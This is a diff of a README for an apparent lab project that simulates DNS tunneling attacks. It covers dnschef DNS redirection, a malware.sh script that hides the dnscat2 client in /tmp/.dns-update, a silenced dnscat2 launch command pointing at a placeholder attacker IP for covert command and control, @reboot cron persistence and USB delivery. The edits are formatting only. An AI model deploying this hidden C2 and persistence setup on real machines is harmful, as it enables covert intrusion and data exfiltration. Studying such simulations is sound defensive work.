@@ -19,7 +19,7 @@ This project simulates a DNS Tunneling attack using:
 ### The attacker machine (Kali Linux) uses dnschef, a rogue DNS proxy, to intercept DNS queries from the victim.
   -Purpose: Redirect DNS queries for a fake domain (e.g., *.tunnel.local) to the attacker's IP, enabling covert C2 communication.
   
-  ![image](https://github.com/user-attachments/assets/0b114df3-97b7-4f8c-bc33-74e2ead71348)
+   ![image](https://github.com/user-attachments/assets/0b114df3-97b7-4f8c-bc33-74e2ead71348)
 
   -Domain Used: tunnel.local (custom pseudo-domain)
   
@@ -27,9 +27,9 @@ This project simulates a DNS Tunneling attack using:
 
   -Behavior: Replies to DNS queries with the attacker's IP instead of resolving them, enabling the victim to unknowingly connect to the dnscat2 server.
 - `/malware`: 🐛 Malware Creation and Deployment
-  ### A custom Bash script (`malware.sh`) was developed to simulate real-world malware behavior using DNS tunneling for covert Command and Control (C2) communication.
+### A custom Bash script (`malware.sh`) was developed to simulate real-world malware behavior using DNS tunneling for covert Command and Control (C2) communication.
   
-![image](https://github.com/user-attachments/assets/bb7d4a97-c78d-40bf-bebf-fd17233af4a3)
+   ![image](https://github.com/user-attachments/assets/bb7d4a97-c78d-40bf-bebf-fd17233af4a3)
 
  #### 🔒 Stealthy Deployment
 - Copies the `dnscat2` client to a hidden path: `/tmp/.dns-update`
@@ -39,9 +39,9 @@ This project simulates a DNS Tunneling attack using:
 - Launches the client using:
   ./dnscat --dns server=<KALI_IP>,port=53 --secret=mysecret >/dev/null 2>&1
  ### ♻️ Persistence
- -Adds a cron job with @reboot to ensure the malware runs on every system startup
+ - Adds a cron job with @reboot to ensure the malware runs on every system startup
  ###💾 Infection Method:
- -Delivered via USB drive
+  - Delivered via USB drive
 - `/dnscat2`: Config files and notes on the client/server interaction
 - `/Autorun`:
 - `/data_exfiltration`: Sample files used in exfiltration
